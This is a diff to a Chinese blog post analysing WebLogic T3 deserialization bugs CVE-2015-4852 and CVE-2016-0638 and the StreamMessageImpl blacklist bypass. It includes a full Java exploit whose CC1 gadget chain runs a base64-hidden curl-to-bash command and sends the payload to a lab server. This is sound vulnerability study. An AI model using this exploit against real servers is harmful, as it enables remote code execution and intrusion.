@@ -12,11 +12,9 @@ image:
 
  
 
-```java
+## CVE-2015-4852分析
 
-```
-
-### 环境配置
+### 环境配置（K:\*\weblogic\newfile\WeblogicEnvironment-master）
 
 ```java
 https://tttang.com/user/RoboTerh  //直接参考这篇文章即可
@@ -133,7 +131,7 @@ if __name__ == "__main__":
 
 ![image-20240618171931171](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618171931171.png)
 
-## 总结一下
+### 总结一下
 
 ```java
 其实就是 拼接 00000000 +T3头+反序列化对象前缀+恶意反序列化对象，然后下面struct.paack()就是重新计算加入恶意数据包的长度
@@ -141,6 +139,187 @@ WeblogicT3对RMI传递过来的数据处理过程非常复杂，分析起来可�
 ```
 
 ![image-20240618163233054](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618163233054.png)
+
+
+
+## CVE-2016-0638分析
+
+环境搭建直接参考上面的url即可：stop后，直接docker restart重启容器即可
+搭建完环境，直接看下补丁.
+
+重点关注一下`InboundMsgAbbrev`这个类，因为它重写了 resolveClass的方法
+发现多了一个`isBlackListed`黑名单校验的方法
+
+![image-20240619151420998](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619151420998.png)
+
+跟进去发现黑名单是这几个
+
+![image-20240619151524512](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619151524512.png)
+
+然后黑名单首先将className判断了一次，然后后面截取最后一个小数点前，又进行了一次判断
+![image-20240619152158207](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619152158207.png)
+
+最终调试发现是到，ChainedTransformer的时候报错了
+![image-20240619152827418](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619152827418.png)
+
+初始化黑名单的方法（ClassFilter.class）,是一个静态方法所以会优先加载，这里就是两个相关的配置
+
+ ```java
+ static {
+         if (!isBlackListDisabled()) {
+             if (!isDefaultBlacklistEntriesDisabled()) {
+                 updateBlackList("+org.apache.commons.collections.functors,+com.sun.org.apache.xalan.internal.xsltc.trax,+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,+org.codehaus.groovy.runtime.ConversionHandler,+org.codehaus.groovy.runtime.MethodClosure");
+             }
+ 
+             updateBlackList(System.getProperty("weblogic.rmi.blacklist", (String)null));
+         }
+ 
+     }
+ ```
+
+ClassFilter.isBlackListed方法同样作用于MsgAbbrevInputStream的resolveClass方法，对其传入的类名进行了同样的黑名单过滤。
+```java
+protected Class resolveClass(ObjectStreamClass descriptor) throws InvalidClassException, ClassNotFoundException {
+    // 通过synchronized关键字锁定了lastCTE对象，以保证线程安全
+    synchronized(this.lastCTE) {
+        // 获取类名
+        String className = descriptor.getName();
+        // 如果className不为空，并且其长度大于0，并且该类名在ClassFilter.isBlackListed()方法中被列入黑名单，则抛出InvalidClassException异常
+        if (className != null && className.length() > 0 && ClassFilter.isBlackListed(className)) {
+            throw new InvalidClassException("Unauthorized deserialization attempt", descriptor.getName());
+        }
+        // 获取当前线程的类加载器ClassLoader
+        ClassLoader ccl = RJVMEnvironment.getEnvironment().getContextClassLoader();
+        // 如果lastCTE对象中的clz为null，或者lastCTE对象中的ccl不等于当前线程的类加载器ccl，则重新加载类
+        if (this.lastCTE.clz == null || this.lastCTE.ccl != ccl) {
+            String classname = this.lastCTE.descriptor.getName();
+            // 如果是PreDiablo的对等体，则调用JMXInteropHelper.getJMXInteropClassName()方法获取Interop的类名
+            if (this.isPreDiabloPeer()) {
+                classname = JMXInteropHelper.getJMXInteropClassName(classname);
+            }
+            // 从PRIMITIVE_MAP（一个Map集合）中获取classname对应的Class对象
+            this.lastCTE.clz = (Class)PRIMITIVE_MAP.get(classname);
+            // 如果获取失败，则调用Utilities.loadClass()方法，加载classname对应的Class对象
+            if (this.lastCTE.clz == null) {
+                this.lastCTE.clz = Utilities.loadClass(classname, this.lastCTE.annotation, this.getCodebase(), ccl);
+            }
+
+            this.lastCTE.ccl = ccl;
+        }
+
+        this.lastClass = this.lastCTE.clz;
+    }
+
+    return this.lastClass;
+}
+```
+
+**注**：MsgAbbrevInputStream用于反序列化RMI请求，将请求参数和返回结果转换为Java对象。InboundMsgAbbrev用于处理入站RMI请求，检查和验证请求的合法性，并保证请求的安全性和可靠性
+
+##### 这里是对CVE-2015-4852补丁的一个绕过，这个漏洞主要是找到了个黑名单之外的类`weblogic.jms.common.StreamMessageImpl`
+
+很容易找到这里的反序列化点，那么就是找谁调用了`readExternal`
+![image-20240619161846259](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619161846259.png)
+
+#### exp
+
+```java
+package com.supeream;
+import com.supeream.serial.Serializables;
+import com.supeream.weblogic.T3ProtocolOperation;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import weblogic.jms.common.StreamMessageImpl;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CVE_2016_0638 {
+    public static byte[] serialize(final Object obj) throws Exception {
+        ByteArrayOutputStream btout = new ByteArrayOutputStream();
+        ObjectOutputStream objOut = new ObjectOutputStream(btout);
+        objOut.writeObject(obj);
+        return btout.toByteArray();
+    }
+
+    public byte[] getObject() throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"bash -c {echo,Y3VybCBodHRwOi8vMTkyLjE2OC4yMzYuMTMwOjQ0NDQ=}|{base64,-d}|{bash,-i}"})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
+        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
+
+        final Map testMap = new HashMap();
+
+        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), secondInvocationHandler);
+        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
+        ctor.setAccessible(true);
+        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
+        byte[] serializeData=serialize(handler);
+        return serializeData;
+    }
+
+    public static void main(String[] args) throws Exception {
+        byte[] payloadObject = new CVE_2016_0638().getObject();
+        StreamMessageImpl streamMessage = new StreamMessageImpl();
+        streamMessage.setDataBuffer(payloadObject,payloadObject.length);
+        byte[] payload2 = Serializables.serialize(streamMessage);
+        T3ProtocolOperation.send("192.168.236.130", "7001", payload2);
+    }
+}
+```
+
+先从exp简单分析一下
+```java
+getObject()方法是一条完整的CC1链子，返回的是序列化的字节码
+
+ byte[] payloadObject = new CVE_2016_0638().getObject();  //CC1序列化的字节码
+        StreamMessageImpl streamMessage = new StreamMessageImpl();
+        streamMessage.setDataBuffer(payloadObject,payloadObject.length); //设置了 字节码,字节码长度
+        byte[] payload2 = Serializables.serialize(streamMessage);   //序列化streamMessage对象为了字节码
+        T3ProtocolOperation.send("192.168.236.130", "7001", payload2);//这个就是T3协议发送这个payload2
+
+序列化了二层，外面的是StreamMessage的，里面是CC1的
+猜测后端解析的时候，首先反序列化解析StreamMessage的，然后解析CC1的
+```
+
+```java
+// 如果消息类型为1，则表示该消息是一个普通的消息。该方法将从ObjectInput中读取PayloadStream对象，并将其用ObjectInputStream进行反序列化，最后将反序列化后的Java对象通过writeObject方法写入消息中
+            case 1:
+                // 从ObjectInput对象中读取PayloadStream对象，并将其作为InputStream对象传递给createPayload方法
+                this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);
+                // 将从PayloadStream对象中获取一个BufferInputStream对象，并将其作为参数传递给ObjectInputStream类的构造函数
+//所以是二层反序列化
+```
+
+![image-20240619175410210](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619175410210.png)
+
+#### 调用链
+
+![image-20240619164548714](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240619164548714.png)
+
+#### 原理
+
+```java
+绕过原理：先将恶意的反序列化对象封装在StreamMessageImpl对象中，然后再对StreamMessageImpl对象进行反序列化，将生成的payload发送至目标服务器。
+目标服务器拿到payload字节码后，读取到类名StreamMessageImpl，此类名不在黑名单中，故可以绕过resolveClass中的过滤。在调用StreamMessageImpl的readObject时，底层会调用其readExternal方法，对封装的序列化数据进行反序列化，从而调用恶意类的readObject函数
+```
 
 
 
